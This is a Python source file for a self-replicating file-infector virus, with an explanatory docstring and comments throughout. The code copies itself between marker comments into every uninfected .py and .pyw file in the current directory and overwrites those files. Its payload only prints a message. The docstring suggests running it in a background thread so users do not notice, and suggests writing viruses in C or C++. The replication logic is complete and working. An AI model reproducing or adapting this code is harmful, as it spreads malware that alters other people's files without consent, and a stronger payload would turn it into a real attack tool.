"""
                                    IMPORTANT
                                    
This code is affected all the python files in the same directory not the subdirectories 


One thing u need to keep in mind is that u should probably run this on second thread in a separate thread
because while the virus code here is running, we can't run the actual funcionality
so the user when he is using this script he is not going to see the functionality that he had before 
because we are blocking the functionality by excuting the malicious piece of code here


It's better to code the virus in C or C++ than in python
"""


###   Start of Virus    ###

import sys, glob

# code of current file is an empty list
code = []

# this virus will be injected in many files
# We should get file name dynamically in reading mode 
with open(sys.argv[0] , 'r') as f :
   # we r gonna save all code lines 
   lines = f.readlines()
   
# we gonna find virus area 
# we only want to inject virus code into other scripts

# we r not in the virus area yet
virus_area = False

for line in lines :
   if line == '###   Start of Virus    ###\n' :
      virus_area = True 
   # if the virus_area has value true 
   if virus_area:
      code.append(line)
   # stop iterating over the lines once reaching the end tag
   if line == '###   End of Virus   ###\n' :
      # break the loop
      break 
          
# finding python scripts in the same directory and affect them     
# we use glob module to find all the files that are pyhton scripts 
python_scripts = glob.glob('*py') + glob.glob('*pyw')

# print a list containing all the files that has extension .py or .pyw
#print(python_scripts)

# Going through all the scripts and then check if they are infected or not
# in case they are not infected , infect them
for script in python_scripts :
   # open up these scripts
   with open(script , 'r') as f :
      # saving the file lines in the scrip_code
      script_code = f.readlines()
      
   # we gonna assume naively that the file in not affected
   infected = False
   # we are going to go through all the lines and keep the file as non infected unless we find proof that it is infected
   for line in script_code :
      if line == '###   Start of Virus    ###\n' :
         infected = True
         # break the loop
         break
  
  
   if not infected :
      # empty list used ti combine the script_code and the virus code
      final_code = []
      # extend our virus code to the final_code
      final_code.extend(code)
      # adding new line to the final_code
      # sometimes if we don't add this new line we add the virus code and then we add the script code after the comment "###   End of Virus   ###" without any spaces 
      final_code.extend('\n')
      # then we add the script_code
      # we don't want to lose functionality, we want to keep it buit also self-replicate and use virus code
      final_code.extend(script_code)
      
      
      # opening script file in the writing mode
      with open(script , 'w') as f : 
         # overwriting the new code "final_code" to the original file
         f.writelines(final_code)
         
#  Malicious piece of code (Payload)
print ("Hey you are affected by a virus code")

###   End of Virus   ###




